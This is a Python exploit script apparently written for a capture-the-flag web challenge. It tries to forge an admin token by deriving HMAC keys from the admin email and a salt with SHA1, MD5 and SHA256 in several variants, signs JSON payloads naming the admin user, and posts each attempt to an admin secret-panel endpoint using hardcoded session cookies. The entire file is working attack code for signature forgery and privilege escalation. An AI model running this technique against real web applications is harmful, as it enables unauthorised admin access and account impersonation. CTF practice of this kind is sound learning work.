#!/usr/bin/env python3
import requests
import hashlib
import hmac
import json
import time

cookies = {
    'session': 'eyJyb2xlIjoidXNlciIsInVzZXJuYW1lIjoiYXR0YWNrZXJAaGFjay5jb20ifQ.aY8nIg.-5P06y6rp6RvKn2kEXflcxK_Bx8',
    'session_key': '8be9a9c2-5c9a-46eb-a097-d0857975ab51'
}

SALT = "SALT_FOR_CTF"
ADMIN = "admin@razzify.local"
URL = "https://challenge.razzify.in/challenge_60/api/admin/secret-panel"

print("="*70)
print("EXHAUSTIVE EXPLOIT - TRYING ALL VARIATIONS")
print("="*70)

# Derive all possible keys
key_input = f"{ADMIN}:{SALT}"
sha1_hash = hashlib.sha1(key_input.encode()).hexdigest()
sha1_bytes = bytes.fromhex(sha1_hash)
md5_hash = hashlib.md5(key_input.encode()).hexdigest()
sha256_hash = hashlib.sha256(key_input.encode()).hexdigest()

# All possible HMAC keys
keys = {
    "SHA1 first 32 hex (UTF-8)": sha1_hash[:32].encode('utf-8'),
    "SHA1 full hex (UTF-8)": sha1_hash.encode('utf-8'),
    "SHA1 raw bytes": sha1_bytes,
    "SHA1 first 16 bytes": sha1_bytes[:16],
    "SHA1 first 32 hex as bytes": bytes.fromhex(sha1_hash[:32]),
    "SALT as UTF-8": SALT.encode('utf-8'),
    "MD5 hex (UTF-8)": md5_hash.encode('utf-8'),
    "SHA256 first 32 hex (UTF-8)": sha256_hash[:32].encode('utf-8'),
    "SHA256 raw bytes": bytes.fromhex(sha256_hash),
}

ts = int(time.time())

# All possible payload formats
payloads = [
    (f'{{"user":"{ADMIN}","ts":{ts}}}', "compact"),
    (f'{{"user": "{ADMIN}", "ts": {ts}}}', "spaced"),
    (f'{{"ts":{ts},"user":"{ADMIN}"}}', "reversed"),
]

print(f"\nTimestamp: {ts}")
print(f"Testing {len(keys)} keys × {len(payloads)} payload formats = {len(keys)*len(payloads)} combinations\n")

success = False

for payload_str, payload_desc in payloads:
    if success:
        break
        
    for key_desc, key_bytes in keys.items():
        if success:
            break
            
        # Sign the payload
        sig = hmac.new(key_bytes, payload_str.encode('utf-8'), hashlib.sha256).hexdigest()
        
        data = {"payload": payload_str, "sig": sig}
        
        try:
            response = requests.post(URL, json=data, cookies=cookies, timeout=5)
            
            if response.status_code == 200:
                print(f"\n{'='*70}")
                print(f"✓ SUCCESS!")
                print(f"{'='*70}")
                print(f"Key type: {key_desc}")
                print(f"Payload format: {payload_desc}")
                print(f"Signature: {sig}")
                print(f"\nRESPONSE:")
                print(response.text)
                success = True
                break
            elif response.status_code == 403 and "Invalid token" in response.text:
                print(f"✗ {key_desc:40} | {payload_desc:10} | Invalid token")
            else:
                print(f"? {key_desc:40} | {payload_desc:10} | HTTP {response.status_code}")
                
        except Exception as e:
            print(f"✗ {key_desc:40} | {payload_desc:10} | Error: {e}")

if not success:
    print(f"\n{'='*70}")
    print("ALL COMBINATIONS FAILED")
    print("="*70)
    print("\nThe server-side implementation must use a different key derivation.")
    print("Try checking for other static files or endpoints.")
